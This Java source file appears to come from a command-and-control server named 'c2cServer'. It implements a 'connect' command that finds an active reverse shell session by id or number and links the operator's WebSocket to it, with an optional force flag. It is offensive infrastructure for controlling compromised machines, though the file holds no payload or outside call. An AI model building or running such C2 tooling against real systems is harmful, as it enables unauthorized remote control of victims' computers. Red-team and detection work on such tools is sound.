package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;
import java.util.Optional;


@Slf4j
public class ConnectCommand implements Command {




    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        Optional<WebSocketSession> targetSessionToBeConnectedTo = SocketUtil.findSessionByIdInSessionSet(
                ConnectionManager.activeReverseShellSessions,args.get(1));
// retry with session number


        if (targetSessionToBeConnectedTo.isEmpty()){
            targetSessionToBeConnectedTo = SocketUtil.findSessionBySessionNumber(ConnectionManager.activeReverseShellSessionsDTO,
                    DataManipulationUtil.parseStringToInteger(args.get(1)));

        }

        if (targetSessionToBeConnectedTo.isPresent()){
            connectToSession(currentSocket, targetSessionToBeConnectedTo.get(), args);
        }else {
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("session '%s' not found ", args.get(1)))
                    .success(false)
                    .build()
            )));


        }

    }

    private void connectToSession(WebSocketSession currentSocket, WebSocketSession socketToConnectTo, List<String> args){
        boolean forceConnect = false;
//        check if the force optional param is in the args
        if (args.size() > 2 && args.get(2) !=null && args.get(2).equalsIgnoreCase("-f") ) {
            forceConnect=true;
        }
        //        establish connection between two manger socket and reverse shell socket
        ConnectionManager.connectTwoSockets(currentSocket,socketToConnectTo, forceConnect);

    }


}
